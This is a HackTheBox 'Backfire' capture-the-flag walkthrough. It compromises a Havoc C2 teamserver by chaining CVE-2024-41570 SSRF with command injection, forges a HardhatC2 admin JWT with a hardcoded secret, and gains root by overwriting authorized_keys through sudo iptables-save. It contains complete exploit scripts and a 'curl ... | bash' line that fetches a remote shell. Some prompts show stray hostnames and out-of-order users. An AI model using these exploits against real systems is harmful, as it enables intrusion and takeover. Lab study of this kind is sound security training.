---
icon: gun
---

# HTB-BACKFIRE

<figure><img src="../../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

#### **Attack Flow Explanation**

**1. Execution (Initial Access)**

1. **Access to Port 8000** – Discovered an open service running on TCP port 8000.
2. **Directory Listing Enabled** – Found that directory listing was enabled, allowing the attacker to browse files on the server.
3. **Havoc Profile with Credentials** – Located a **Havoc C2 profile** file containing stored credentials.
4. **CVE-2024-41570 + Authenticated RCE** – Using the credentials, exploited **CVE-2024-41570** to achieve authenticated **Remote Code Execution** and gain a shell as **ilya**.

**2. Privilege Escalation**

5. **Forge Cookie & Create User** – Forged an authentication cookie and created a new user account to gain access to **Hardhat**.
6. **Remote Code Execution in Hardhat** – Exploited the Hardhat environment to execute commands remotely, gaining a shell as **sergej**.
7. **Overwrite `authorized_keys` via iptables-save** – Abused the `iptables-save` command to overwrite the `authorized_keys` file, enabling SSH key-based login as **root**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
PORT     STATE    SERVICE  REASON              VERSION
22/tcp   open     ssh      syn-ack ttl 63      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey:                                                                                                        
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuxaL9aCVxiQGLRxQPezW3dkgouskvb/BcBJR16VYjHElq7F8C2ByzUTNr0OMeiwft8X5vJaD9GBqoEul4D1QE=
|   256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)          
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2oT7Hn4aUiSdg4vO9rJIbVSVKcOVKozd838ZStpwj8
443/tcp  open     ssl/http syn-ack ttl 63      nginx 1.22.1                
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=ACME/stateOrProvinceName=Florida/countryName=US/streetAddress=/localityName=Miami/postalCode=8900
| Subject Alternative Name: IP Address:127.0.0.1                                                                      
| Issuer: commonName=127.0.0.1/organizationName=ACME/stateOrProvinceName=Florida/countryName=US/streetAddress=/localityName=Miami/postalCode=8900
| Public Key type: rsa                                                                                                
| Public Key bits: 2048                                                                                               
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-17T16:08:55
| Not valid after:  2028-01-17T16:08:55                   
| MD5:   fc03:9065:d59a:f2ae:cd85:bb78:f710:d5c7
| SHA-1: 7799:55d3:c2b6:aa58:41e5:7cb6:7055:078d:a463:2081
| -----BEGIN CERTIFICATE-----       
| MIID1TCCAr2gAwIBAgIRAJdMN/B3DeQBkzcvuShP3uYwDQYJKoZIhvcNAQELBQAw
| bDELMAkGA1UEBhMCVVMxEDAOBgNVBAgTB0Zsb3JpZGExDjAMBgNVBAcTBU1pYW1p
| MQkwBwYDVQQJEwAxDTALBgNVBBETBDg5MDAxDTALBgNVBAoTBEFDTUUxEjAQBgNV
| BAMTCTEyNy4wLjAuMTAeFw0yNTAxMTcxNjA4NTVaFw0yODAxMTcxNjA4NTVaMGwx
| CzAJBgNVBAYTAlVTMRAwDgYDVQQIEwdGbG9yaWRhMQ4wDAYDVQQHEwVNaWFtaTEJ
| MAcGA1UECRMAMQ0wCwYDVQQREwQ4OTAwMQ0wCwYDVQQKEwRBQ01FMRIwEAYDVQQD
| EwkxMjcuMC4wLjEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDbduCd
| d7U+Dv8PevbWHSpsGW3894nCxGBQKXLm4S0vCC5Q+m0nWEiyjXAKSfgR+OVpbF8Z
| 5PWTZG+aUbuRiB3UR2jja1vTUm7ZOAQwfYSeq9wHZtjsT3njrZarHJzhnULLOvK1
| sGCKi7yNM1nHfxsaN6WHbruTw0iMPxc2zKWTbQcf/Zhl6m5uhLoDwoDC7RawM1fa
| OxKgCaKPdXclPZqo0fRPcdeXj7IHe/o0RUTBoBZUd5T6kSyOeTHWfStG4lCcmkmT
| 4jbaomjTvlenDj6qk3ptYXs+GOzuABrnfXiOkKtNPryqu8gskXjQHo2yPAWq3wbt
| 5F/QbGiVHe9OY3qxAgMBAAGjcjBwMA4GA1UdDwEB/wQEAwICpDAdBgNVHSUEFjAU
| BggrBgEFBQcDAQYIKwYBBQUHAwIwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQU
| 0C235ZzG59nldU14DMSAaR+jgPIwDwYDVR0RBAgwBocEfwAAATANBgkqhkiG9w0B
| AQsFAAOCAQEAXybFqYKaF3+cQA4rS97DkW6yekPAv+sGuGewLQIYRNc2EKjaKz44
| bzJipUbvwQsQqqtGYeNQxf0Qt9hIsN8JUAK9poplap9XCpeyTOmdR7+A8ojoJv+/
| M3ii0fuNfOMJnnjdaQoZG04+mMe+X0OCulNcR6H8Whz1YJEF5t9HV41caSPs4cM0
| /Yf1hUKwQMt2tFDX5hPv+tsuiw2nn8PTuntDvkcnlQxipQTcek1jjvgFTGvWdRO2                                   
| WcVuaiEScZq85Cy+fRHHZXGz4lL3tQQ3CPAZOZ/WiY5Y13xPbbYrvC1EwJaSUlv5
| ncklkNFnxyBoBEAdOS0xQsTcaTfqI2Qi7g==                                                                                
|_-----END CERTIFICATE-----
|_http-title: 404 Not Found
| tls-alpn:                                     
|   http/1.1                                        
|   http/1.0                                     
|_  http/0.9                       
|_http-server-header: nginx/1.22.1   
|_ssl-date: TLS randomness does not represent time
5000/tcp filtered upnp     port-unreach ttl 63
8000/tcp open     http     syn-ack ttl 63      nginx 1.22.1 
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.22.1
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 11:31  disable_tls.patch
| 875   17-Dec-2024 11:34  havoc.yaotl
|_
|_http-title: Index of /
|_http-open-proxy: Proxy might be redirecting requests
```

Besides the _usual_ SSH port there are two HTTP(s) ports. The certificate on port 443 has 127.0.0.1 as a common name, that’s odd, and the port 8000 apparently has directory listing enabled and exposes two files. Based on the filename `havoc.yaotl` it’s a profile for [Havoc](https://github.com/HavocFramework/Havoc).

### Execution <a href="#execution" id="execution"></a>

Checking out the `havoc.yaotl` file confirms the assumption. It does contain the domain `backfire.htb` and two users along with their credentials:

* `ilya:CobaltStr1keSuckz!`
* `sergej:1w4nt2sw1tch2h4rdh4tc2`

```perl
Teamserver {
    Host = "127.0.0.1"
    Port = 40056
 
    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}
 
Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }
 
    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}
 
Demon {
    Sleep = 2
    Jitter = 15
 
    TrustXForwardedFor = false
 
    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
 
Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
```

Additionally the patch file shows the removal of the _secure_ version of the web socket protocol and effectively a downgrade to non-encrypted communication between the connector and the team server.

**disable\_tls.patch** [#execution](htb-backfire.md#execution "mention")

```python
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver
 
diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
                }
 
                // start the teamserver
-               if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+               if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
                        logger.Error("Failed to start websocket: " + err.Error())
                }
```

A quick research regarding vulnerabilities in **Havoc** finds [CVE-2024-41570](https://github.com/chebuya/Havoc-C2-SSRF-poc), a server-side request forgery, that leverages the agent registration to send HTTP request from the team server. After cloning the repository with the PoC and running the script with the information from the **Havoc** profile, I do get a callback on my web server.

```python
sn0x㉿sn0x)-[~/hackthebox/backfire]
└─$ git clone https://github.com/chebuya/Havoc-C2-SSRF-poc && cd Havoc-C2-SSRF-poc
 
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ python exploit.py -t https://bigbang.htb -i 10.10.10.10 -p 80
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
HTTP/1.0 404 File not found
Server: SimpleHTTP/0.6 Python/3.13.2
Date: Sun, 04 May 2025 13:49:03 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 335
 
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
```

Even though it confirms that the application is in fact vulnerable, it does not provide any additional leads. No other web server is running on localhost that could be enumerated through the SSRF.

After some more research I find another interesting [blog post](https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/) that references the previous found CVE. This time it’s an authenticated command injection that can be combined with the other vulnerability to access team servers, that are not exposed to the (public) network. That’s exactly the case here! It also comes with a [proof-of-concept](https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce).

Now what’s left to do is to combine the two PoCs in order to send the necessary web socket requests for the RCE through the SSRF.

sn0xsploit.py [#execution](htb-backfire.md#execution "mention")

```python
# Exploit Title: Havoc C2 0.7 Unauthenticated SSRF
# Date: 2024-07-13
# Exploit Author: @_chebuya
# Software Link: https://github.com/HavocFramework/Havoc
# Version: v0.7
# Tested on: Ubuntu 20.04 LTS
# CVE: CVE-2024-41570
# Description: This exploit works by spoofing a demon agent registration and checkins to open a TCP socket on the teamserver and read/write data from it. This allows attackers to leak origin IPs of teamservers and much more.
# Github: https://github.com/chebuya/Havoc-C2-SSRF-poc
# Blog: https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/
import binascii
import random
import requests
import argparse
import urllib3
urllib3.disable_warnings()
 
 
from Crypto.Cipher import AES
from Crypto.Util import Counter
 
key_bytes = 32
 
def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"
 
    assert len(key) == key_bytes
 
    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
 
    plaintext = aes.decrypt(ciphertext)
    return plaintext
 
 
def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)
 
 
def encrypt(key, iv, plaintext):
 
    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"
 
        assert len(key) == key_bytes
 
        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)
 
        ciphertext = aes.encrypt(plaintext)
        return ciphertext
 
def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id
 
    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)
 
    data =  b"\xab" * 100
 
    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
 
    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")
 
 
def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"
 
    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"
 
    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"
 
 
    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)
 
    forward_port = int_to_bytes(target_port)
 
    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)
 
    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data
 
 
    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")
 
 
def write_socket(socket_id, data):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"
 
    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"
 
    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"
 
    data_length = int_to_bytes(len(data))
 
    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)
 
    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data
 
    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")
 
 
def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"
 
    header_data = command + request_id
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data
 
 
    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""
 
 
    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]
 
    return decrypt(AES_Key, AES_IV, enc_package)[12:]
 
 
 
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")
# Custom
parser.add_argument("-au", "--auth-username", help="The username to authenticate against the Teamserver", required=True)
parser.add_argument("-ap", "--auth-password", help="The password to authenticate against the Teamserver", required=True)
parser.add_argument("-c", "--command", help="Command to execute on the Teamserver", default="whoami")
 
args = parser.parse_args()
 
 
# 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
        "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))
 
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
 
socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))
 
import hashlib
import json
import os
 
def build_handshake(host='127.0.0.1', port='80', uri='havoc/') -> bytes:
    return '\r\n'.join([
        f'GET /{uri} HTTP/1.1',
        f'Host: {host}:{port}',
        'Upgrade: websocket',
        'Connection: Upgrade',
        'Sec-Websocket-Key: dGhlIHNhbXBsZSBub25jZQ==',
        'Sec-Websocket-Version: 13',
        '\r\n'
        ]).encode()
 
def build_websocket_frame(data: str) -> bytes:
    payload = data.encode()
 
    fin = 0x80 
    opcode = 0x1
    header = bytes([fin | opcode])
 
    length = len(payload)
    mask_bit = 0x80
    if length <= 125:
        header += bytes([mask_bit | length])
    elif length <= 65535:
        header += bytes([mask_bit | 126]) + length.to_bytes(2, 'big')
    else:
        header += bytes([mask_bit | 127]) + length.to_bytes(8, 'big')
 
    masking_key = os.urandom(4)
    masked_data = bytes(b ^ masking_key[i % 4] for i, b in enumerate(payload))
 
    return header + masking_key + masked_data
 
# Adapted from https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce
 
# Send handshake
request_data = build_handshake(args.ip, args.port, 'havoc/')
write_socket(socket_id, request_data)
 
# Authenticate to teamserver
payload = {"Body": {"Info": {"Password": hashlib.sha3_256(args.auth_password.encode()).hexdigest(), "User": args.auth_username}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": args.auth_username}}
request_data = build_websocket_frame(json.dumps(payload))
write_socket(socket_id, request_data)
 
# Create a listener to build demon agent for
payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": args.auth_username}}
request_data = build_websocket_frame(json.dumps(payload))
write_socket(socket_id, request_data)
 
# Send command
injection = """ \\\\\\\" -mbla; """ + args.command + """ 1>&2 && false #"""
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
    "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": args.auth_username}}
request_data = build_websocket_frame(json.dumps(payload))
write_socket(socket_id, request_data)
```

Since the Team Server is expecting a web socket connection the very first request sent through the SSRF is a handshake. Then all following payloads have to be converted into valid web socket frames to be understood by the receiving end.

Running this script with the credentials from the profile and a command to **curl** my web server results in a hit there and I can proceed to get a reverse shell as `ilya` this way. This let’s me read the first flag.

```python
sn0x㉿sn0x)-[~/hackthebox/backfire]
└─$ python exploit.py -t https://backfire.htb \
                    -i 127.0.0.1 \
                    -p 40056 \
                    -au 'ilya' \
                    -ap 'CobaltStr1keSuckz!' \
                    -c 'curl http://10.10.10.10/shell | bash'
```

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

#### Shell as sergej <a href="#shell-as-sergej" id="shell-as-sergej"></a>

Within the home directory of user `ilya` I find a text note regarding the **default** installation of [HardhatC2](https://github.com/DragoQCC/CrucibleC2). There is such a process owned by `sergej` and open ports `5000` and `7096`.

hardhat.txt

```

Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C#

```

Apparently there are multiple vulnerabilities in **Hardhat** that can be used to achieve remote code execution with a [proof-of-concept](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7) available. The application uses a hardcoded value to sign JWT cookies and therefore arbitrary cookies can be forged.

I’ll modify the Python script to create a new user to contact `127.0.0.1:5000` instead and forward the ports `5000` and `7096` to my machine via **SSH**<br>

cre@te\_user.py [#privilege-escalation](htb-backfire.md#privilege-escalation "mention")

```python

# @author Siam Thanat Hack Co., Ltd. (STH)  
import jwt  
import datetime  
import uuid  
import requests  
  
rhost = '127.0.0.1:5000'  
  
# Craft Admin JWT  
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"  
issuer = "hardhatc2.com"  
now = datetime.datetime.utcnow()  
  
expiration = now + datetime.timedelta(days=28)  
payload = {  
    "sub": "HardHat_Admin",    
    "jti": str(uuid.uuid4()),  
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",  
    "iss": issuer,  
    "aud": issuer,  
    "iat": int(now.timestamp()),  
    "exp": int(expiration.timestamp()),  
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"  
}  
  
token = jwt.encode(payload, secret, algorithm="HS256")  
print("Generated JWT:")  
print(token)  
  
# Use Admin JWT to create a new user 'sth_pentest' as TeamLead  
burp0_url = f"https://{rhost}/Login/Register"  
burp0_headers = {  
  "Authorization": f"Bearer {token}",  
  "Content-Type": "application/json"  
}  
burp0_json = {  
  "password": "sth_pentest",  
  "role": "TeamLead",  
  "username": "sth_pentest"  
}  
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)  
print(r.text)

```

After executing the script I can login on `https://127.0.0.1:7096` with the credentials `sth_pentest:sth_pentest`. This user is part of the `TeamLead` role and can interact with implants and also the host itself. Navigating to **ImplantInteract** and opening a new terminal tab let’s me run a command to receive a shell as `sergej`.

<figure><img src="../../../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

Shell as root [#privilege-escalation](htb-backfire.md#privilege-escalation "mention")

Checking out the sudo privileges for `sergej`, the user can run two commands as `root`.\
With `iptables` I can add new firewall and networking rules and `iptables-save` lets me backup them to a file. This allows me to change the contents of _any_ file considering I run those commands as `root` and this can be used to escalate my privileges as described in this [blog](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/).

First I create a new SSH key of type `ed25519` to get a extra short strings.

```python
sn0x㉿sn0x)-[~/hackthebox/backfire]
└─$ ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/sergej/.ssh/id_ed25519): privesc
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in privesc
Your public key has been saved in privesc.pub
The key fingerprint is:
SHA256:s2EMDDizGunpizYp+Oyp/w59DmiDNyav6eXhdhiBSDo sergej@backfire
The key's randomart image is:
+--[ED25519 256]--+
|   ..            |
| .+  o           |
|+..+  o          |
|E...   o         |
|.+. .   S        |
|.+ +   . +       |
|= Xo= . .        |
|+&+B.=           |
|OO@=+ .          |
+----[SHA256]-----+
 
sn0x㉿sn0x)-[~/hackthebox/backfire]
└─$ cat privesc.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd6nll4WSUJs+W67s18DDIT2pOotxm2ADQgdUf7Wv7L sergej@backfire
```

Then I set the public key as a comment to a network rule. I add a newline at the beginning and the end of the key to ensure that it will end up on a line by itself when I save the rules to a file.

```
ilya@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
 
ilya@backfire:~$ ssh -i privesc root@127.0.0.1
 
root@backfire:~# whoami
uid=0(root) gid=0(root) groups=0(root)
```

Thanks For reading !

![](<../../../../.gitbook/assets/complete (12).gif>)<br>
